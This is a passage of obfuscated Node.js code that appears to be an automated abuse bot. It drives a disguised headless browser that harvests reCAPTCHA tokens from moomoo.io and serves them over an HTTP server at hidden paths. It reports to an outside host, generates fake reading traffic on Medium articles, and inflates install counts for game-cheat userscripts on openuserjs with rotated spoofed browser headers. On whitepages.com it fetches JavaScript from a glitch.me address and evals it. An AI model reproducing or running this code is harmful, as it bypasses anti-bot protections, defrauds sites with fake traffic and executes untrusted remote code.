      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + T(0x7) + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': T(0x12) + 'easyfork.o' + V(0x5) + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + U(0x11, '%OqV') + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': T(0x12) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x3 * -0x2c9 + -0x2a4 * -0xb + 0x77b * -0x5
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const W = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1a56 + -0x14ee + -0x2f44 * -0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k[W(0x3, 'U]A6')];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x15e5 + -0x9 * -0x15d + -0x42 * 0x83), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xdca + -0x11a1 + 0x1 * 0x1fcf), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * 0x22d7 + 0x109c + -0x3373;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xc03 * 0x2 + -0xaa1 + -0xd65; w < getRandomInt(0x2691 * 0x1 + -0x3b6 + -0x22da, -0x278 * -0xe + -0x4 * -0x938 + 0x476b * -0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x10d * 0x125 + 0x1 * -0xfb6f + 0xb1ee);
        }
      }();
    }, 0x1 * -0x2d3 + -0x170 * -0x1a + -0x2229), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const X = d;
        axios['post']('https://st' + X(0x1) + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x17d * 0x3 + -0xd65 + 0x4 * 0x477;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x125f * 0x1 + -0x145f + -0x39 * -0xae, 0x358 + -0x1 * -0x1c62 + -0x1f88)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xab2e + 0x25 * -0x4eb + 0x7ff9);
    }, 0x2542 + 0xc3d + -0x311b), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x19d2 + 0x1a4 + -0x2 * 0xdbb;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xe99 + -0x1 * 0x1af9 + -0x1 * -0x1818), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2b7 * 0x3 + 0x109c + -0x18c1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x121481 + 0xed65 * 0x17 + -0x53e07 * -0x2);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1e49 + -0x18e9 + -0x2c * 0x1d);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x941 * 0x3 + 0xa2 + -0x1 * 0x1b9d);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x22 * -0x13e + -0x115b * 0x1 + -0x3b * -0x1d);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = c,
    Z = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const Y = d,
          A = j['random']();
        return [
          A,
          A['includes'](Y(0x9))
        ];
      }()),
      v = function(A, B = -0xb9b * 0x1 + -0x22f2 + -0x3b * -0xca) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x205a + 0xb * -0x1fb + 0x14a * 0x2a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x73e + -0xdea * 0x1 + -0x2 * -0xa94, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1 * 0x977 + 0x1 * 0x1e5a + 0x1 * -0x14e3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2538 + -0x2111 + 0x6d59),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xba1 + -0x4759 + 0x7a0a),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + Z(0x4, 'zPB@') + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + Z(0xe, ']r9]') + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a0(0x0) + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x167 * -0x13 + -0xd76 + -0x1 * -0x281b; k < 0x1796 * -0x1 + 0x1a * -0xe8 + 0x2f2a; k++)
    setTimeout(f, (-0x133f2 + -0x963 * -0x2d + 0x77eb) * k * getRandomInt(0x43 * -0x55 + 0x2044 + -0xa04, 0x1e1b + -0x19 * -0xff + 0x169 * -0x27));
  setInterval(() => {
    f();
    for (let l = 0xb10 + -0x1 * 0xb3e + -0x17 * -0x2; l < 0x5 * -0x434 + -0x2122 * -0x1 + -0xc1a; l++)
      setTimeout(f, (0xa * 0xe9f + -0xc507 + 0x1 * 0x11d31) * l * getRandomInt(-0xf1 * -0x1 + -0xf * -0x89 + -0x8f7, -0x5 * 0x6dc + -0x1b4c + 0x3d9b));
  }, 0x44a1 * -0x97 + 0x16927a + 0x48d6fd);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
